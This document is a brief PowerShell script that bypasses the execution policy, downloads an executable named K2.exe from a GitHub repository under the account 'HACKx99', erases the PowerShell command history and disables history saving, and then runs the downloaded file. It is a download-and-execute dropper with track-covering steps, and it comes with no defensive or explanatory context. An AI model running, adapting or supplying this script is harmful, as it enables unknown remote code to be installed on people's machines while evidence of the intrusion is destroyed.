# PowerShell Script to Download, Force Run EXE in PS, Clear History
try {
    # Bypass execution policy
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue

    # Define URL and history path
    $exeUrl = "https://github.com/HACKx99/WebSite/raw/main/K2.exe"
    $tempPath = "C:\Windows\Temp\K2.exe"
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    # Download EXE
    Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing

    if (Test-Path $tempPath) {
        # Clear PowerShell history
        Clear-History -ErrorAction SilentlyContinue
        if (Test-Path $historyPath) {
            Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
        }
        Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
        
        # Force run EXE within PowerShell console
        cmd.exe /c "C:\Windows\Temp\K2.exe"
    }

} catch {
    Write-Error "Error: $($_.Exception.Message)"
}
